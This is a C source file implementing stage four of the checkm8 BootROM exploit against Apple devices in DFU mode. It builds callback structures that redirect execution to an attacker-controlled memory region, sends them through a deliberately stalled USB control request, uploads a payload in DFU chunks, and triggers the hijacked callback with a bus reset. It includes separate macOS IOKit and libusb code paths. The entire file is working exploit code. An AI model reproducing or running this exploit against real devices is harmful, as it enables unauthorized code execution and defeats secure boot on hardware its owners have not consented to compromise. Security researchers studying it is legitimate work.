/* checkm8_patch.c -- checkm8 stage 4: callback setup + payload send */

#include <stddef.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <libusb.h>

#if defined(__APPLE__)
#include <CoreFoundation/CoreFoundation.h>
#include <IOKit/IOCFPlugIn.h>
#include <IOKit/usb/IOUSBLib.h>
#endif

#include "dfu/dfu_handler.h"
#include "dfu/checkm8.h"
#include "dfu/checkm8_internal.h"
#include "dfu/dfu_proto.h"
#include "device/chip_db.h"
#include "device/usb_dfu.h"
#include "util/usb_helpers.h"
#include "util/log.h"

#if defined(__APPLE__)
#include "dfu/iokit_usb.h"
#endif

/* ------------------------------------------------------------------ */
/* macOS IOKit direct USB backend                                      */
/*                                                                     */
/* libusb's darwin backend uses DeviceRequestAsyncTO for ALL control    */
/* transfers, even libusb_control_transfer().  After an EP0 STALL      */
/* the async path never recovers -- transfers time out because IOKit's */
/* internal pipe state blocks new async dispatches.                    */
/*                                                                     */
/* IOKit's DeviceRequestTO (truly synchronous) goes through a          */
/* different kernel code path that handles EP0 STALL recovery.         */
/* ------------------------------------------------------------------ */

#if defined(__APPLE__)

typedef struct {
    IOUSBDeviceInterface320 **device;
    CFRunLoopSourceRef async_source;
} iokit_dfu_handle_t;

static int iokit_open_dfu(iokit_dfu_handle_t *h)
{
    CFMutableDictionaryRef matching;
    io_service_t serv;
    IOCFPlugInInterface **plugin;
    SInt32 score;
    IOReturn kr;
    int16_t vid = 0x05AC;
    int16_t pid = 0x1227;
    CFNumberRef cf_vid, cf_pid;

    memset(h, 0, sizeof(*h));

    matching = IOServiceMatching(kIOUSBDeviceClassName);
    if (!matching) {
        log_error("IOKit: IOServiceMatching failed");
        return -1;
    }

    cf_vid = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt16Type, &vid);
    cf_pid = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt16Type, &pid);
    CFDictionarySetValue(matching, CFSTR(kUSBVendorID), cf_vid);
    CFDictionarySetValue(matching, CFSTR(kUSBProductID), cf_pid);
    CFRelease(cf_vid);
    CFRelease(cf_pid);

    serv = IOServiceGetMatchingService(0, matching);
    if (!serv) {
        log_error("IOKit: DFU device not found (05ac:1227)");
        return -1;
    }

    kr = IOCreatePlugInInterfaceForService(serv, kIOUSBDeviceUserClientTypeID,
                                           kIOCFPlugInInterfaceID,
                                           &plugin, &score);
    IOObjectRelease(serv);
    if (kr != kIOReturnSuccess || !plugin) {
        log_error("IOKit: plugin interface failed: 0x%x", kr);
        return -1;
    }

    kr = (*plugin)->QueryInterface(plugin,
            CFUUIDGetUUIDBytes(kIOUSBDeviceInterfaceID320),
            (LPVOID *)&h->device);
    IODestroyPlugInInterface(plugin);
    if (kr != kIOReturnSuccess || !h->device) {
        log_error("IOKit: device interface failed: 0x%x", kr);
        return -1;
    }

    kr = (*h->device)->USBDeviceOpen(h->device);
    if (kr != kIOReturnSuccess) {
        log_error("IOKit: USBDeviceOpen failed: 0x%x", kr);
        (*h->device)->Release(h->device);
        h->device = NULL;
        return -1;
    }

    kr = (*h->device)->SetConfiguration(h->device, 1);
    log_info("IOKit: SetConfiguration(1) ret=0x%x", kr);

    kr = (*h->device)->CreateDeviceAsyncEventSource(h->device,
                                                     &h->async_source);
    if (kr == kIOReturnSuccess && h->async_source) {
        CFRunLoopAddSource(CFRunLoopGetCurrent(), h->async_source,
                           kCFRunLoopDefaultMode);
        log_info("IOKit: async event source added to run loop");
    }

    log_info("IOKit: DFU device opened");
    return 0;
}

static int iokit_ctrl_transfer(iokit_dfu_handle_t *h,
                               uint8_t bmRequestType, uint8_t bRequest,
                               uint16_t wValue, uint16_t wIndex,
                               void *data, uint16_t wLength,
                               uint32_t timeout_ms)
{
    IOUSBDevRequestTO req;
    IOReturn kr;

    memset(&req, 0, sizeof(req));
    req.bmRequestType = bmRequestType;
    req.bRequest = bRequest;
    req.wValue = wValue;
    req.wIndex = wIndex;
    req.wLength = wLength;
    req.pData = data;
    req.completionTimeout = timeout_ms;
    req.noDataTimeout = timeout_ms;

    kr = (*h->device)->DeviceRequestTO(h->device, &req);

    if (kr == kIOReturnSuccess)
        return (int)req.wLenDone;
    if (kr == kIOUSBPipeStalled) {
        log_warn("IOKit DeviceRequestTO: STALL (wLenDone=%u)", req.wLenDone);
        return LIBUSB_ERROR_PIPE;
    }
    if (kr == kIOReturnAborted) {
        log_warn("IOKit DeviceRequestTO: ABORTED (wLenDone=%u)",
                 req.wLenDone);
        return LIBUSB_ERROR_INTERRUPTED;
    }

    log_warn("IOKit DeviceRequestTO failed: IOReturn=0x%x wLenDone=%u",
             kr, req.wLenDone);
    return LIBUSB_ERROR_OTHER;
}

static void iokit_close(iokit_dfu_handle_t *h)
{
    if (!h)
        return;
    if (h->async_source) {
        CFRunLoopRemoveSource(CFRunLoopGetCurrent(), h->async_source,
                              kCFRunLoopDefaultMode);
        CFRelease(h->async_source);
        h->async_source = NULL;
    }
    if (h->device) {
        (*h->device)->USBDeviceClose(h->device);
        (*h->device)->Release(h->device);
        h->device = NULL;
    }
}

#endif /* __APPLE__ */

/* ------------------------------------------------------------------ */
/* DFU_GETSTATUS (quick, fire-and-forget)                              */
/* ------------------------------------------------------------------ */

/*
 * dfu_getstatus_quick -- Send DFU_GETSTATUS with a short 200ms timeout.
 *
 * Purpose: Trigger the dfuDNLOAD-SYNC → dfuDNLOAD-IDLE state transition
 * in the device's DFU state machine.  On usbipd the STATUS response is
 * always dropped (we get LIBUSB_ERROR_TIMEOUT), but the device processes
 * the SETUP packet and makes the transition anyway.  Sending GETSTATUS
 * here allows the next DFU_DNLOAD or the final zero-length DFU_DNLOAD
 * (MANIFEST trigger) to be accepted by the device.
 */
static void dfu_getstatus_quick(libusb_device_handle *usb)
{
    unsigned char buf[6];
    int ret = usb_ctrl_transfer_raw(usb, 0xA1, 0x03, 0, 0,
                                    buf, sizeof(buf), 200);
    if (ret == 6) {
        log_info("dfu_getstatus_quick: state=0x%02X status=0x%02X "
                 "(device responded -- may be non-usbipd path)", buf[4], buf[0]);
    } else if (ret == LIBUSB_ERROR_TIMEOUT) {
        log_info("dfu_getstatus_quick: timed out (usbipd normal) -- "
                 "device should have transitioned dfuDNLOAD-SYNC->IDLE");
    } else {
        log_info("dfu_getstatus_quick: ret=%d (%s)", ret, libusb_strerror(ret));
    }
}


/*
 * build_overwrite_64 -- Build a 64-bit DFU callback structure.
 *
 * For chips without tlbi: callback = insecure_memory_base.
 * For chips with tlbi (newer): callback = nop_addr,
 *   next = insecure_memory_base.
 */
static void build_overwrite_64(checkm8_overwrite_t *ow,
                               const chip_info_t *chip)
{
    memset(ow, 0, sizeof(*ow));

    if (CPID_HAS_TLBI(chip)) {
        /* Newer path: callback -> nop_addr, next -> start of redirect chain
         * in the payload.  The redirect chain is written at
         * insecure_memory_base + offsetof(dfu_callback_t, callback)
         * by usb_rop_callbacks().  iBoot processes this as a linked list
         * of callback structs; the first entry is at base + 0x20. */
        ow->callback.callback = chip->nop_addr;
        ow->callback.next     = chip->insecure_memory_base
                                    + offsetof(dfu_callback_t, callback);
        log_debug("build_overwrite_64: callback=0x%llX (nop), "
                  "next=0x%llX (redirect_chain)",
                  (unsigned long long)ow->callback.callback,
                  (unsigned long long)ow->callback.next);
    } else {
        /* Older path: callback -> insecure_memory_base directly */
        ow->callback.callback = chip->insecure_memory_base;
        log_debug("build_overwrite_64: callback=0x%llX (insecure_mem)",
                  (unsigned long long)ow->callback.callback);
    }
}

/*
 * build_overwrite_armv7 -- Build a 32-bit ARMv7 DFU callback structure.
 */
static void build_overwrite_armv7(dfu_callback_armv7_t *cb,
                                  const chip_info_t *chip)
{
    memset(cb, 0, sizeof(*cb));
    cb->callback = (uint32_t)chip->insecure_memory_base;
    log_debug("build_overwrite_armv7: callback=0x%X",
              cb->callback);
}

/* ------------------------------------------------------------------ */
/* Send overwrite via control request                                  */
/* ------------------------------------------------------------------ */

/*
 * send_overwrite -- Send the callback data to the device.
 *
 *   bmRequestType = 0x02 (host-to-device, standard, endpoint)
 *   bRequest      = 0x03
 *   wValue        = 0
 *   wIndex        = 0x80
 *
 * The transfer must STALL -- that confirms the data landed in the
 * target region. Uses the full USB timeout (not async) so we can
 * check the STALL return code.
 */
static int send_overwrite(libusb_device_handle *usb,
                          const void *data, size_t len)
{
    int ret;

    ret = usb_ctrl_transfer_raw(usb, 0x02, 0x03, 0, 0x80,
                                (unsigned char *)(uintptr_t)data,
                                (uint16_t)len, USB_TIMEOUT_MS);

    /*
     * libusb returns LIBUSB_ERROR_PIPE for a STALL.
     *
     * On usbipd-win the STALL for this transfer may arrive as
     * LIBUSB_ERROR_TIMEOUT instead of PIPE.  Accept both as
     * "data landed" -- the following payload send will confirm.
     */
    if (ret == LIBUSB_ERROR_PIPE) {
        log_info("send_overwrite: STALL (PIPE) received -- write confirmed, "
                 "%zu bytes sent", len);
        return 0;
    }

    if (ret == LIBUSB_ERROR_TIMEOUT) {
        log_info("send_overwrite: TIMEOUT (usbipd STALL quirk for data transfers) "
                 "-- treating as write landed, %zu bytes", len);
        return 0;
    }

    /* Any other result (including success) is unexpected */
    log_error("send_overwrite: expected STALL, got %d (%s)",
              ret, libusb_strerror(ret));
    return -1;
}

/* ------------------------------------------------------------------ */
/* Send payload in DFU_MAX_TRANSFER_SZ chunks                          */
/* ------------------------------------------------------------------ */

/*
 * send_payload_chunks -- Send payload data via DFU_DNLOAD.
 *
 * All chunks use wValue=0 (block number 0).
 * The block number is NOT incremented between chunks.
 *
 * Uses raw usb_ctrl_transfer instead of dfu_dnload() to avoid the
 * latter's block-number parameter being passed as wValue.
 */
static int send_payload_chunks(libusb_device_handle *usb,
                               const uint8_t *payload, size_t payload_len)
{
    size_t offset = 0;
    size_t chunk;
    int ret;

    while (offset < payload_len) {
        chunk = payload_len - offset;
        if (chunk > DFU_MAX_TRANSFER_SZ)
            chunk = DFU_MAX_TRANSFER_SZ;

        /* bmRequestType=0x21, bRequest=DFU_DNLOAD(1), wValue=0, wIndex=0
         * Use a generous timeout to ensure the full DATA phase completes.
         * On usbipd the STATUS ACK is dropped (TIMEOUT) but the device
         * receives all the bytes.
         *
         * On macOS, the handle was refreshed (close+reopen+SET_CONFIGURATION)
         * after the overwrite STALL, so the sync path works cleanly.
         * The async path (DeviceRequestAsync) does not complete on a
         * reopened handle even with fresh pipe objects. */
        ret = usb_ctrl_transfer_raw(usb, 0x21, DFU_REQ_DNLOAD, 0, 0,
                                    (unsigned char *)(uintptr_t)(payload + offset),
                                    (uint16_t)chunk, USB_TIMEOUT_MS);
        log_info("send_payload_chunks: offset=%zu chunk=%zu ret=%d (%s)",
                 offset, chunk, ret, ret < 0 ? libusb_strerror(ret) : "ok");
        if (ret < 0 && ret != LIBUSB_ERROR_TIMEOUT) {
            log_error("send_payload_chunks: hard error at offset %zu: %s",
                      offset, libusb_strerror(ret));
            return -1;
        }

        offset += chunk;
    }

    log_debug("send_payload_chunks: sent %zu bytes total", payload_len);
    return 0;
}

/* ------------------------------------------------------------------ */
/* Finalize DFU transfer (suffix + zero-length + USB reset)            */
/* ------------------------------------------------------------------ */

/*
 * send_dfu_finalize -- Finalize the DFU download:
 *
 * 1. Send DFU_FILE_SUFFIX_LEN (16) zero bytes via DFU_DNLOAD wValue=0
 * 2. Send zero-length DFU_DNLOAD wValue=0 → device enters MANIFEST-SYNC
 * 3. DFU_GETSTATUS × 3 → device transitions through MANIFEST states
 *    (on usbipd these timeout but the device processes the transitions)
 * 4. libusb_reset_device → sends USB bus reset; device in MANIFEST-WAIT-RESET
 *    exits, fires the dfu_handle_bus_reset callback → completion
 *
 * The USB bus reset fires the checkm8 callback, not the zero-length
 * DFU_DNLOAD.  The zero-length DFU_DNLOAD just puts DFU into
 * MANIFEST-WAIT-RESET state so it's ready to act on the bus reset.
 *
 * WARNING: On usbipd, libusb_reset_device MAY cause the device to reboot
 * out of DFU if not yet in the correct state.
 * This is acceptable -- the retry loop will reconnect.
 */
static int send_dfu_finalize(libusb_device_handle *usb)
{
    uint8_t suffix[DFU_FILE_SUFFIX_LEN];
    int ret;

    /* Step 1: 16 zero bytes as DFU_DNLOAD (DFU file suffix). */
    memset(suffix, 0, sizeof(suffix));
    ret = usb_ctrl_transfer_raw(usb, 0x21, DFU_REQ_DNLOAD, 0, 0,
                                suffix, DFU_FILE_SUFFIX_LEN, USB_TIMEOUT_MS);
    log_info("send_dfu_finalize: 16-byte suffix ret=%d (%s)",
             ret, ret < 0 ? libusb_strerror(ret) : "ok");

    /*
     * Step 2: Zero-length DFU_DNLOAD -- triggers dfuMANIFEST-SYNC entry.
     * On usbipd STATUS ACK is dropped (TIMEOUT) but the device transitions.
     */
    ret = usb_ctrl_transfer_no_data_raw(usb, 0x21, DFU_REQ_DNLOAD,
                                        0, 0, USB_TIMEOUT_MS);
    log_info("send_dfu_finalize: zero-length DNLOAD ret=%d (%s)",
             ret, ret < 0 ? libusb_strerror(ret) : "ok");

    /*
     * Step 3: DFU_GETSTATUS × 3 to walk through MANIFEST states:
     *   MANIFEST-SYNC → MANIFEST → MANIFEST-WAIT-RESET
     * On usbipd responses are dropped (TIMEOUT) but the device processes
     * the state transitions when it receives the SETUP packets.
     * Three DFU_GETSTATUS calls walk through the state machine.
     */
    dfu_getstatus_quick(usb);  /* MANIFEST-SYNC → MANIFEST */
    dfu_getstatus_quick(usb);  /* MANIFEST (callback fires) */
    dfu_getstatus_quick(usb);  /* MANIFEST-WAIT-RESET */

    /*
     * Step 4: USB bus reset.
     * This fires the dfu_handle_bus_reset callback: the device exits
     * dfuMANIFEST-WAIT-RESET, the callback fires, the completion marker
     * is set, and the device stays in DFU (instead of rebooting).
     *
     * On usbipd this MAY cause the device to reboot out of DFU if we're
     * not actually in MANIFEST-WAIT-RESET.  The caller handles this by
     * closing the handle, waiting for re-enumeration, and checking status.
     */
    log_info("send_dfu_finalize: USB bus reset (libusb_reset_device)...");
    ret = libusb_reset_device(usb);
    log_info("send_dfu_finalize: libusb_reset_device ret=%d (%s)",
             ret, ret < 0 ? libusb_strerror(ret) : "ok");

    return 0;
}

/* ------------------------------------------------------------------ */
/* Stage 4: Patch -- callback setup + send payload                     */
/* ------------------------------------------------------------------ */

int checkm8_stage_patch(dfu_ctx_t *ctx)
{
    const chip_info_t *chip;
    uint8_t iserial_idx;

    if (!ctx || !ctx->dev || !ctx->chip)
        return -1;

    chip = ctx->chip;
    iserial_idx = ctx->dev->iserial_index ? ctx->dev->iserial_index : 3;
    log_info("checkm8: stage 4/4 -- callback + payload");

    log_debug("checkm8_stage_patch: chip=%s cpid=0x%04X "
              "insecure_memory_base=0x%llX",
              chip->name, chip->cpid,
              (unsigned long long)chip->insecure_memory_base);

    /* Assemble the payload if not already done */
    if (!ctx->payload_buf) {
        log_debug("checkm8_stage_patch: assembling payload...");
        if (assemble_payload(ctx) != 0) {
            log_error("checkm8_stage_patch: payload assembly failed");
            return -1;
        }
        log_info("checkm8_stage_patch: payload assembled, %zu bytes",
                 ctx->payload_len);
    } else {
        log_debug("checkm8_stage_patch: payload already assembled (%zu bytes)",
                  ctx->payload_len);
    }

#if defined(__APPLE__)
    /*
     * macOS Apple Silicon: payload-then-overwrite, skip MANIFEST.
     *
     * Order: payload → GETSTATUS → overwrite → STALL → bus reset
     *
     * The overwrite STALL kills EP0 on Apple Silicon XHCI (the
     * controller does not auto-clear the halt), so we must send the
     * payload BEFORE the overwrite.  We skip the DFU finalize sequence
     * (suffix + zero-len + 3×GETSTATUS) that would trigger MANIFEST —
     * MANIFEST processing verifies/rejects the non-IMG4 payload and
     * zeroes the DFU buffer at insecure_memory_base.  Without MANIFEST,
     * the payload stays intact.  The bus reset fires the callback
     * at the USB level regardless of DFU state.
     *
     * When the shared IOKit backend (iokit_usb) is active, EP0 is
     * clean — IOKit's DeviceRequestTO uses XHCI Stop Endpoint (not
     * libusb's AbortPipeZero).  No reset/reopen/prime needed.
     *
     * When iokit_usb is NOT active (fallback), use the local
     * iokit_dfu_handle_t with the full reset+reopen+prime cycle.
     */
    {
        iokit_dfu_handle_t iokit_local;
        uint8_t status_buf[6];
        size_t offset;
        int kr;
        int use_shared = iokit_usb_is_active();

        memset(&iokit_local, 0, sizeof(iokit_local));

        if (use_shared) {
            log_info("checkm8_stage_patch: macOS -- payload-first, "
                     "no MANIFEST, via shared IOKit (EP0 clean)");
        } else {
            log_info("checkm8_stage_patch: macOS -- payload-first, "
                     "no MANIFEST, via local IOKit (EP0 workaround)");
        }

        if (!use_shared) {

            usb_dfu_close(ctx->dev->usb);
            ctx->dev->usb = NULL;
            usleep(10000);

            if (iokit_open_dfu(&iokit_local) != 0) {
                log_error("checkm8_stage_patch: IOKit open (for reset) failed");
                return -1;
            }
            log_info("checkm8_stage_patch: IOKit ResetDevice + "
                     "USBDeviceReEnumerate (clearing XHCI EP0 state)");
            (*iokit_local.device)->ResetDevice(iokit_local.device);
            (*iokit_local.device)->USBDeviceReEnumerate(iokit_local.device, 0);
            iokit_close(&iokit_local);
            usleep(1500000);

            {
                int iokit_retries;
                int iokit_opened = 0;
                for (iokit_retries = 0; iokit_retries < 5; iokit_retries++) {
                    if (iokit_open_dfu(&iokit_local) == 0) {
                        iokit_opened = 1;
                        break;
                    }
                    log_info("checkm8_stage_patch: IOKit reopen retry %d/5",
                             iokit_retries + 1);
                    usleep(300000);
                }
                if (!iokit_opened) {
                    log_error("checkm8_stage_patch: IOKit reopen after "
                              "reset failed");
                    return -1;
                }
            }

            {
                uint8_t prime_buf[6];
                int prime_ret = iokit_ctrl_transfer(&iokit_local,
                                    0xA1, 0x03, 0, 0,
                                    prime_buf, 6, USB_TIMEOUT_MS);
                log_info("checkm8_stage_patch: pipe prime (GETSTATUS) "
                         "ret=%d state=0x%02X", prime_ret,
                         prime_ret >= 6 ? prime_buf[4] : 0xFF);
                if (prime_ret < 0) {
                    uint8_t gs_buf[2];
                    int gs_ret = iokit_ctrl_transfer(&iokit_local,
                                    0x80, 0x00, 0, 0,
                                    gs_buf, 2, USB_TIMEOUT_MS);
                    log_info("checkm8_stage_patch: pipe prime fallback "
                             "(GET_STATUS) ret=%d", gs_ret);
                }
            }

            /* From here on, the local handle is used for all transfers.
             * We need a macro/helper to unify the call sites. */
        }

        /* Helper macro: route to shared or local IOKit handle */
        #define IOKIT_XFER(rt, rq, wv, wi, d, wl, to) \
            (use_shared \
                ? iokit_usb_ctrl_transfer((rt),(rq),(wv),(wi),(d),(wl),(to)) \
                : iokit_ctrl_transfer(&iokit_local,(rt),(rq),(wv),(wi),(d),(wl),(to)))

        /* TLBI chips: pre-overwrite stall+leak */
        if (CPID_HAS_TLBI(chip)) {
            uint8_t leak_buf[DFU_MAX_TRANSFER_SZ];
            log_info("checkm8_stage_patch: TLBI -- IOKit stall+leak");
            kr = IOKIT_XFER(0x02, 0x03, 0, 0x80, NULL, 0, 5);
            log_info("checkm8_stage_patch: IOKit stall ret=%d", kr);
            kr = IOKIT_XFER(0x80, 0x06,
                            (uint16_t)(0x0300 | iserial_idx),
                            0x040A, leak_buf, DFU_MAX_TRANSFER_SZ, 5);
            log_info("checkm8_stage_patch: IOKit leak ret=%d", kr);
        }

        /* Step 0: DFU_ABORT → dfuIDLE.
         * After stage 2's async cancel the device is likely stuck in
         * dfuDNLOAD-SYNC, which rejects DFU_DNLOAD.  DFU_ABORT is a
         * zero-data control transfer (SETUP+STATUS only) so it works
         * even when EP0 OUT data TRBs are degraded. */
        kr = IOKIT_XFER(0x21, DFU_REQ_ABORT, 0, 0,
                        NULL, 0, USB_TIMEOUT_MS);
        log_info("checkm8_stage_patch: DFU_ABORT ret=%d", kr);

        kr = IOKIT_XFER(0xA1, 0x03, 0, 0,
                        status_buf, 6, USB_TIMEOUT_MS);
        log_info("checkm8_stage_patch: post-abort GETSTATUS ret=%d "
                 "state=0x%02X", kr,
                 kr >= 6 ? status_buf[4] : 0xFF);

        /* Step 1: Payload via DFU_DNLOAD (before overwrite — STALL
         * kills EP0 on Apple Silicon XHCI) */
        log_info("checkm8_stage_patch: sending payload (%zu bytes, "
                 "%zu-byte chunks)", ctx->payload_len,
                 (size_t)DFU_MAX_TRANSFER_SZ);
        for (offset = 0; offset < ctx->payload_len; ) {
            size_t chunk = ctx->payload_len - offset;
            if (chunk > DFU_MAX_TRANSFER_SZ)
                chunk = DFU_MAX_TRANSFER_SZ;
            kr = IOKIT_XFER(0x21, DFU_REQ_DNLOAD, 0, 0,
                            (void *)(ctx->payload_buf + offset),
                            (uint16_t)chunk, USB_TIMEOUT_MS);
            log_info("checkm8_stage_patch: payload offset=%zu chunk=%zu "
                     "ret=%d", offset, chunk, kr);
            if (kr < 0) {
                log_error("checkm8_stage_patch: payload send failed at "
                          "offset %zu: ret=%d", offset, kr);
                if (!use_shared) iokit_close(&iokit_local);
                return -1;
            }
            offset += chunk;
        }

        /* Step 2: Single GETSTATUS to commit data (dfuDNLOAD-SYNC →
         * dfuDNLOAD-IDLE).  Do NOT send suffix/zero-len — that would
         * trigger MANIFEST which verifies the non-IMG4 payload, fails,
         * and zeroes the DFU buffer at insecure_memory_base. */
        kr = IOKIT_XFER(0xA1, 0x03, 0, 0,
                        status_buf, 6, USB_TIMEOUT_MS);
        log_info("checkm8_stage_patch: GETSTATUS ret=%d state=0x%02X",
                 kr, kr >= 6 ? status_buf[4] : 0xFF);

        /* Step 3: Callback write → STALL.
         * This is the LAST control transfer — EP0 dies after STALL. */
        if (CPID_IS_ARMV7(chip->cpid)) {
            dfu_callback_armv7_t cb;
            build_overwrite_armv7(&cb, chip);
            log_info("checkm8_stage_patch: overwrite ARMv7 "
                     "(%zu bytes)", sizeof(cb));
            kr = IOKIT_XFER(0x02, 0x03, 0, 0x80,
                            &cb, (uint16_t)sizeof(cb), 5);
        } else {
            checkm8_overwrite_t ow;
            build_overwrite_64(&ow, chip);
            log_info("checkm8_stage_patch: overwrite AArch64 "
                     "(%zu bytes)", sizeof(ow));
            kr = IOKIT_XFER(0x02, 0x03, 0, 0x80,
                            &ow, (uint16_t)sizeof(ow), 5);
        }

        if (kr != LIBUSB_ERROR_PIPE) {
            log_warn("checkm8_stage_patch: overwrite expected STALL "
                     "(PIPE=%d), got %d -- continuing anyway",
                     LIBUSB_ERROR_PIPE, kr);
        } else {
            log_info("checkm8_stage_patch: overwrite STALL confirmed "
                     "(write landed)");
        }

        /* Step 4: Bus reset — fires the callback at USB level
         * regardless of DFU state (no MANIFEST needed). */
        log_info("checkm8_stage_patch: IOKit ResetDevice (port-level "
                 "bus reset)");
        if (use_shared) {
            iokit_usb_reset_device();
            usleep(50000);
            log_info("checkm8_stage_patch: IOKit USBDeviceReEnumerate");
            iokit_usb_reenumerate();
        } else {
            (*iokit_local.device)->ResetDevice(iokit_local.device);
            usleep(50000);
            log_info("checkm8_stage_patch: IOKit USBDeviceReEnumerate");
            (*iokit_local.device)->USBDeviceReEnumerate(iokit_local.device, 0);
            iokit_close(&iokit_local);
        }

        #undef IOKIT_XFER

        ctx->phase = DFU_PHASE_PATCH;
        log_info("checkm8: stage 4 complete -- payload-first, "
                 "no MANIFEST, via IOKit");
        return 0;
    }
#else
    /*
     * Linux/Windows: libusb handles EP0 STALL correctly.
     * Use libusb for entire stage 4.
     */
    {
        libusb_device_handle *usb = ctx->dev->usb;

        /* TLBI chips: pre-overwrite stall+leak */
        if (CPID_HAS_TLBI(chip)) {
            log_debug("checkm8_stage_patch: TLBI -- pre-overwrite stall+leak");
            if (!checkm8_usb_request_stall(usb) ||
                !checkm8_usb_request_leak(usb, iserial_idx)) {
                log_error("checkm8_stage_patch: pre-overwrite stall/leak failed");
                return -1;
            }
            log_debug("checkm8_stage_patch: pre-overwrite stall+leak OK");
        }

        /* Overwrite */
        if (CPID_IS_ARMV7(chip->cpid)) {
            dfu_callback_armv7_t cb;
            build_overwrite_armv7(&cb, chip);
            log_info("checkm8_stage_patch: sending ARMv7 overwrite (%zu bytes)",
                     sizeof(cb));
            if (send_overwrite(usb, &cb, sizeof(cb)) != 0)
                return -1;
        } else {
            checkm8_overwrite_t ow;
            build_overwrite_64(&ow, chip);
            log_info("checkm8_stage_patch: sending AArch64 overwrite (%zu bytes)",
                     sizeof(ow));
            if (send_overwrite(usb, &ow, sizeof(ow)) != 0)
                return -1;
        }
        log_info("checkm8_stage_patch: overwrite STALL received");

        /* Payload */
        log_info("checkm8_stage_patch: sending payload (%zu bytes in %zu-byte chunks)",
                 ctx->payload_len, (size_t)DFU_MAX_TRANSFER_SZ);
        if (send_payload_chunks(usb, ctx->payload_buf,
                                ctx->payload_len) != 0) {
            log_error("checkm8_stage_patch: payload send failed");
            return -1;
        }
        log_info("checkm8_stage_patch: payload sent, finalizing");

        send_dfu_finalize(usb);
        usleep(100000);

        ctx->phase = DFU_PHASE_PATCH;
        log_info("checkm8: stage 4 complete -- payload delivered, finalize sent");
        return 0;
    }
#endif /* __APPLE__ */
}
